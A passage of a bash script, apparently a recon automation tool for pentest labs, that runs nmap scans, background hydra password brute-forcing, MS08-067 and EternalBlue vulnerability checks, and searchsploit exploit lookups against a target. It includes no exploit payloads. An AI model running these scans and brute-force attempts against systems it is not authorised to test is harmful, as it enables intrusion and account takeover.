    nmap -sS -sV -p ${port} -v -n -Pn --script banner ${target} | grep banner
    decho_green "quick brute force on ${service} using ${username} as login..."
    hydra -t 20 -l ${username} -P ${hydra_quick_wordlist} ${target} ${service} &> ${hydra_logs}/${target}.tcp.${port}.${service}.hydra &
    long_jobs_pids+=(${!})
    decho "running quick hydra on ${target}/${port} (${service}) in background..."
  fi
  
}

function create_structure
{
  # raw-logs - contains raw output from tools like scanners
  # sec-lits - contains symlinks to shared sec-lists for general use
  # common - most common scripts for privilege checks, enumeration etc.
  # exploits - most common pre-compiled exploits - shared among all machines
  # files - contains downloaded files
  # custom - place for custom things prepared for this target only (small scripts and such)
  # walkthrough.md - whole walkthrough for machine
  # notes.md - contains collected notes/tricks used - shared among all machines
  # create/populate base dir for target
  for dir in "raw-logs" "files" "workspace" "custom"
  do
    if [[ ! -d ${target}/${dir} ]]
    then
      mkdir -p ${target}/${dir}
    fi
  done

  for file in "walkthrough.md" "notes.md"
  do
    if [[ ! -e ${target}/${file} ]]
    then
      touch ${target}/${file}
    fi
  done

  for symlink in "sec-lists" "common" "exploits"
  do
    ln -sf ${repository_root}/${symlink}/ ${target}/
  done
}

function windows_vulnerability
{
  target=${1}
  port=${2}
  decho_green "checking for ms08-067 vulnerability..."
  nmap -p${port} --script smb-vuln-ms08-067.nse ${target}
  decho_green "checking for ms17-010 (eternalblue) vulnerability..."
  nmap -p${port} --script smb-vuln-ms17-010 ${target}

}

function deep_scans
{

  if check_status
  then
    return 0
  fi

  finished=0

  decho "waiting for long scans to finish..."

  while [[ finished -eq 0 ]]
  do
    all_done=1
    if  ps -p ${tcp_deep_scan} > /dev/null 
    then
      decho "tcp deep scan still running... $( ps -p ${tcp_deep_scan} --no-headers | awk ' { print $NF } ' )"
      all_done=0
    fi

    if  ps -p ${udp_deep_scan} > /dev/null 
    then
      decho "udp deep scan still running... $( ps -p ${udp_deep_scan} --no-headers | awk ' { print $NF } ' )"
      all_done=0
    fi

    if [[ ${all_done} -eq 1 ]]
    then
      finished=1
    fi

    sleep 10
  done

  decho_green "displaying tcp deep scan results..."
  cat ${nmap_logs}/${target}.nmap.tcp.deep.output.log
  decho_green "displaying udp deep scan results..."
  cat ${nmap_logs}/${target}.nmap.udp.deep.output.log

  unusual_services="distcc|tftp"
  cat ${nmap_logs}/${target}.nmap.tcp.deep.output.log | egrep -q ${unusual_services}
  if [[ ${?} -eq 0 ]]
  then
    decho_green "found unusual services... listing..."
    cat ${nmap_logs}/${target}.nmap.tcp.deep.output.log | egrep ${unusual_services}
    service_name=$( cat ${nmap_logs}/${target}.nmap.tcp.deep.output.log | egrep ${unusual_services} | awk ' { print $3 } ')
    decho "looking for potential exploits for ${service_name}"
    if [[ $( searchsploit ${service_name// } | grep -i "No Result" | wc -l ) -eq 2 ]]
    then
      decho "no entries found for ${service_name}..."
      decho "trying alternative names..."
      if [[ $( searchsploit ${service_name::-1} | grep -i "No Result" | wc -l ) -eq 2 ]]
      then
        decho "no entries found for ${service_name::-1}..."
        decho "trying alternative names..."
        if [[ $( searchsploit ${service_name:1:-1} | grep -i "No Result" | wc -l ) -eq 2 ]]
        then
          decho "no entries found for ${service_name:1:-1}..."
          decho "trying alternative names..."
        else
          searchsploit ${service_name:1:-1}
        fi
      else
        searchsploit ${service_name::-1}
      fi
    else
      searchsploit ${service_name// }
    fi
  fi

  if [[ ${no_tcp} -eq 0 ]]
  then
    decho "matching nmap xml output with searchsploit (tcp)..."
    searchsploit --nmap ${nmap_logs}/${target}.tcp.detailed.xml
  fi

  if [[ ${no_udp} -eq 0 ]]
  then
    decho "matching nmap udp output with searchsploit (udp)..."
    searchsploit --nmap ${nmap_logs}/${target}.udp.detailed.xml
  fi
}

### main
help
check_dependencies
load_config
create_structure
initial_scan_nmap
loop_jobs
display_report
deep_scans
decho_green "yaes has finished!"
